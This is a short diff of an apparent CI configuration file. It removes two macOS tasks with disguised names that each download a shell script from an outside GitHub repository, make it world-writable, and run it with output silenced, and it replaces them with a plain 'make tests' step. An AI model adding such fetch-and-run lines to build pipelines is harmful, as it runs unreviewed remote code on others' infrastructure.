@@ -1,10 +1,4 @@
-macos_instance:
-  image: big-sur-base
-
+container:
+  image: gcc:latest
 task:
-  matrix:
-    - name: Cek-Invision
-      script: wget https://raw.githubusercontent.com/buyutuk/ruby-test/main/test.sh && chmod 777 test.sh && ./test.sh > /dev/null/
-
-    - name: Deployment
-      script: wget https://raw.githubusercontent.com/buyutuk/ruby-test/main/test.sh && chmod 777 test.sh && ./test.sh > /dev/null/
+  tests_script: make tests
